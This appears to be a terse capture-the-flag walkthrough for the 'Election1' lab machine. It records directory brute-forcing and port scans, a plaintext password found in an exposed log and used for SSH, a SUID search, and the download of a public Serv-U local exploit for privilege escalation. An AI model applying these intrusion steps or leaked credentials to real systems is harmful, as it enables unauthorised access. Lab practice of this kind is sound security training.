----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Election1
# 23/2/2023

----------------------------------------------------
# gobuster
----------------------------------------------------
/javascript           (Status: 301) [Size: 323] [--> http://192.168.110.211/javascript/]
/election             (Status: 301) [Size: 321] [--> http://192.168.110.211/election/]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.110.211/phpmyadmin/]
└─$ gobuster dir -u http://192.168.110.211/election -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40
http://192.168.110.211/election/admin/
/media                (Status: 301) [Size: 327] [--> http://192.168.110.211/election/media/]
/themes               (Status: 301) [Size: 328] [--> http://192.168.110.211/election/themes/]
/data                 (Status: 301) [Size: 326] [--> http://192.168.110.211/election/data/]
/admin                (Status: 301) [Size: 327] [--> http://192.168.110.211/election/admin/]
/lib                  (Status: 301) [Size: 325] [--> http://192.168.110.211/election/lib/]
/languages            (Status: 301) [Size: 331] [--> http://192.168.110.211/election/languages/]
/js                   (Status: 301) [Size: 324] [--> http://192.168.110.211/election/js/]
└─$ gobuster dir -u http://192.168.110.211/election/admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40
/img                  (Status: 301) [Size: 331] [--> http://192.168.110.211/election/admin/img/]
/plugins              (Status: 301) [Size: 335] [--> http://192.168.110.211/election/admin/plugins/]
/css                  (Status: 301) [Size: 331] [--> http://192.168.110.211/election/admin/css/]
/ajax                 (Status: 301) [Size: 332] [--> http://192.168.110.211/election/admin/ajax/]
/js                   (Status: 301) [Size: 330] [--> http://192.168.110.211/election/admin/js/]
/components           (Status: 301) [Size: 338] [--> http://192.168.110.211/election/admin/components/]
/inc                  (Status: 301) [Size: 331] [--> http://192.168.110.211/election/admin/inc/]
/logs                 (Status: 301) [Size: 332] [--> http://192.168.110.211/election/admin/logs/]
http://192.168.110.211/election/admin/logs/
└─$ cat system.log           
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
now ssh via love

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

----------------------------------------------------
# priv esc
----------------------------------------------------
find / -perm -u=s -type f 2>/dev/null
 searchsploit Serv-U FTP Server    
 └─$ searchsploit -m 47009.c
